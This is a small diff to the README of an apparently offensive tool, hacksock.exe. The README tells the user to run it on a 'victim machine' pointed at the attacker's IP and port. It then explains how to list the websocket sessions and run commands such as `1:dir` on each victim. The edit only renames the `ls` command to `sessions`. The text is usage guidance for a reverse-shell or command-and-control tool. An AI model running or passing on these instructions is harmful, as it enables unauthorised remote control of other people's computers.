@@ -19,9 +19,9 @@ On the victim machine, either alter the source so no arguments are required or r
 
 `hacksock.exe [attackers IP] [port]`
 
-Use `ls` to see all websocket connections.
+Use `sessions` to see all websocket connections.
 
-Use `[id]:[Command]` to run commands i.e. if only one connection then `1:dir` will run dir on the first connection listed in `ls`.
+Use `[id]:[Command]` to run commands i.e. if only one connection then `1:dir` will run dir on the first connection listed in `sessions`.
 
 Use `exit` to end the server or `1:exit` to end the client connection `1`.
 
